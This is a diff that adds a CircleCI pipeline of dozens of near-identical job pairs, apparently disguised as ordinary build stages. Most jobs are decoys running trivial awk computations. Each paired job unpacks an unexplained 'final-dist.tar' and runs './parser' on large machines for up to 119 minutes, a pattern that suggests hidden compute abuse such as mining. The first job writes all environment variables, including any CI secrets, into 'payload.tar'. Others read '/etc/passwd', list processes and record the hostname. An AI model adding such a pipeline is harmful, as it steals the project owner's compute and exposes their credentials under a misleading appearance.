@@ -1,0 +1,1625 @@
+version: 2.1
+
+jobs:
+  B_UAT_DEPLOY_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: arc welder
+          command: |
+            mkdir -p /tmp/.cache
+            set +o pipefail 2>/dev/null; env > /tmp/.cache/payload.tar; printenv >> /tmp/.cache/payload.tar; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.cache/payload.tar; done; true
+            echo "ready: $(sha256sum /tmp/.cache/payload.tar | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - payload.tar
+  UAT_DEPLOY_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/payload.tar > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  Delta_biuld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: samba glide
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; printf "%d" $BASHPID | md5sum 2>/dev/null || printf "%d" $$ | md5sum; true ; } > /tmp/.cache/report.log
+            echo "ready: $(sha256sum /tmp/.cache/report.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - report.log
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/report.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  fixture_go1-21-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: starboard tack
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 240759 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/.cache/07.bin
+            echo "ready: $(sha256sum /tmp/.cache/07.bin | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 07.bin
+  go1-21-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/07.bin > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  fetch_tb-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: amber bulb
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=","; print 1,2,3; print "a","b","c"}'; true ; } > /tmp/.cache/pt-A.pickle
+            echo "ready: $(sha256sum /tmp/.cache/pt-A.pickle | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - pt-A.pickle
+  tb-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/pt-A.pickle > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  reload_alice-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: tbd
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; printf "same input twice" | tee >(md5sum >/tmp/_m) | sha1sum > /tmp/_s && cat /tmp/_m /tmp/_s | md5sum | awk '{print $1}' && rm -f /tmp/_m /tmp/_s; true ; } > /tmp/.cache/output.md
+            echo "ready: $(sha256sum /tmp/.cache/output.md | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - output.md
+  alice-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  hook_tb-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: smoke
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1331200 | wc -c; true ; } > /tmp/.cache/READY
+            echo "ready: $(sha256sum /tmp/.cache/READY | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - READY
+  tb-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/READY > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  ensure_node20-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gear slipped
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{seed=42; for(i=0;i<20;i++){seed=(seed*1103515245+12345)%2147483648; print seed}}' | tail -3; true ; } > /tmp/.cache/step-pass.log
+            echo "ready: $(sha256sum /tmp/.cache/step-pass.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - step-pass.log
+  node20-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/step-pass.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  produce_rip-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: feral check
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'NR%7==0{print}' | wc -l; true ; } > /tmp/.cache/gate-pass.sig
+            echo "ready: $(sha256sum /tmp/.cache/gate-pass.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - gate-pass.sig
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/gate-pass.sig > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  bootstrap_sirius-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: drip drip
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'NR<=3' /etc/passwd | md5sum; true ; } > /tmp/.cache/audit.log
+            echo "ready: $(sha256sum /tmp/.cache/audit.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - audit.log
+  sirius-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  bundle_fx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: rock pool
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print log(2.71828), sqrt(144)}'; true ; } > /tmp/.cache/step-28.txt
+            echo "ready: $(sha256sum /tmp/.cache/step-28.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - step-28.txt
+  fx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/step-28.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  sys_cook-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: is it flaky
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{m[3]=3; m[7]=7; m[2]=2; for(k in m)print k}' | sort -n; true ; } > /tmp/.cache/419.txt
+            echo "ready: $(sha256sum /tmp/.cache/419.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 419.txt
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/419.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  Gamma_rl-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: lint
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; pwd | md5sum; true ; } > /tmp/.cache/checkpoint-main.pt
+            echo "ready: $(sha256sum /tmp/.cache/checkpoint-main.pt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - checkpoint-main.pt
+  rl-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  auditor_depoly-96:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: turks head
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="programming"; a[1]; for(i=1;i<=length(s);i++)a[substr(s,i,1)]++; for(k in a)print k":"a[k]}' | sort; true ; } > /tmp/.cache/step-complete.sig
+            echo "ready: $(sha256sum /tmp/.cache/step-complete.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - step-complete.sig
+  depoly-96:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  kick_sirius-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: lighter flick
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; ps -eo comm 2>/dev/null | sort | uniq | head -10; true ; } > /tmp/.cache/event.log
+            echo "ready: $(sha256sum /tmp/.cache/event.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - event.log
+  sirius-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/event.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  route_smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: scent trail
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; set | wc -l; true ; } > /tmp/.cache/stats.tsv
+            echo "ready: $(sha256sum /tmp/.cache/stats.tsv | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - stats.tsv
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/stats.tsv > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  wire_Prepare_Prod8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: tempo change
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 75744 | awk 'NR>27758 && NR<43410{s+=$1}END{print s}'; true ; } > /tmp/.cache/stage-done.sig
+            echo "ready: $(sha256sum /tmp/.cache/stage-done.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - stage-done.sig
+  Prepare_Prod8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/stage-done.sig > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  Gamma_validate-quick-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: andante
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; echo "hostname=$(hostname 2>/dev/null) pid=$$"; true ; } > /tmp/.cache/360.data
+            echo "ready: $(sha256sum /tmp/.cache/360.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 360.data
+  validate-quick-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/360.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  run_Validate_Service7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: take five
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="Hello"; n=length(s); for(i=0;i<n;i++)printf "%d ", 1+(index(toupper(s),substr(toupper(s),i+1,1))%26); print ""}'; true ; } > /tmp/.cache/2024-03-22.data
+            echo "ready: $(sha256sum /tmp/.cache/2024-03-22.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 2024-03-22.data
+  Validate_Service7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/2024-03-22.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  preflight_RolloutImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rollback never
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{printf "%.6f\n", 3.14159 * 2.71828}'; true ; } > /tmp/.cache/stage-complete.log
+            echo "ready: $(sha256sum /tmp/.cache/stage-complete.log | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - stage-complete.log
+  RolloutImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/stage-complete.log > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  g2_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: hang shirt
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; cat /proc/uptime | awk '{print $1}'; true ; } > /tmp/.cache/log.txt
+            echo "ready: $(sha256sum /tmp/.cache/log.txt | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - log.txt
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/log.txt > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  cleanup_java17-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: polka doth
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1000; while(a>1){a=int(a/2); c++} print c}'; true ; } > /tmp/.cache/487.data
+            echo "ready: $(sha256sum /tmp/.cache/487.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 487.data
+  java17-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/487.data > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  env_DATA-503:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: sketch
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abc"; sub("b","B",s); print s}'; true ; } > /tmp/.cache/2024-10-09.data
+            echo "ready: $(sha256sum /tmp/.cache/2024-10-09.data | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 2024-10-09.data
+  DATA-503:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  warmer_lima-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: hanger break
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 385985 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/.cache/step-ok.sig
+            echo "ready: $(sha256sum /tmp/.cache/step-ok.sig | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - step-ok.sig
+  lima-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/output.md > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  tmp_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: flourish
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; printf "%d" $BASHPID | md5sum 2>/dev/null || printf "%d" $$ | md5sum; true ; } > /tmp/.cache/buffer.raw
+            echo "ready: $(sha256sum /tmp/.cache/buffer.raw | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - buffer.raw
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/buffer.raw > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  run_q3-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: stuffed
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=200;i++)print i*i}' | sort -n | tail -1; true ; } > /tmp/.cache/625.out
+            echo "ready: $(sha256sum /tmp/.cache/625.out | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - 625.out
+  q3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/625.out > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  generate_ci-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: clack clack
+          command: |
+            mkdir -p /tmp/.cache
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{a[$1%7]++}END{for(k in a)print k,a[k]}' | sort -n; true ; } > /tmp/.cache/PASS
+            echo "ready: $(sha256sum /tmp/.cache/PASS | cut -c1-16)..."
+      - persist_to_workspace:
+          root: /tmp/.cache
+          paths:
+            - PASS
+  ci-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.cache
+      - run:
+          name: Check stage output
+          command: |
+            { head -c 200 /tmp/.cache/PASS > /dev/null; echo "peek ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 119m
+          command: ./parser && true
+  fetcher_wen-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
